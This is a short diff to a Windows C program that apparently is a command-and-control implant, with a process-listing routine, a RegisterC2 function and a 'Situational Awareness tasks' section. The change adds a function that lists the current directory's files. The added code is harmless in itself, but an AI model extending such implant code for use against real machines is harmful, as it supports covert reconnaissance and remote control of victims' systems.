@@ -21,6 +21,7 @@
 #include <stdio.h>
 #include <winhttp.h>
 #include <tlhelp32.h>
+#include <dirent.h>
 #include <zmq.h>
 
 // Print all running processes
@@ -39,6 +40,21 @@ void ReadEnvironmentVariables(){
         printf("%s\n", ProcessStruct.szExeFile);
     }while(Process32Next(hSnap, &ProcessStruct));
     CloseHandle(hSnap);
+}
+
+// List files in directory
+void ls(char* path){
+    // Open context
+    DIR *d;
+    d = opendir(path);
+
+    struct dirent *de;
+    if (d != NULL){
+        while ( de = readdir(d)){
+            printf("%s\n", de->d_name);
+        }
+        closedir(d);
+    }
 }
 
 void RegisterC2(_TCHAR* gid){
@@ -125,6 +141,7 @@ int _tmain(int argc, _TCHAR *argv[]){
 
     // Situational Awareness tasks
     ReadEnvironmentVariables();
+    ls(".");
 
     /*
 
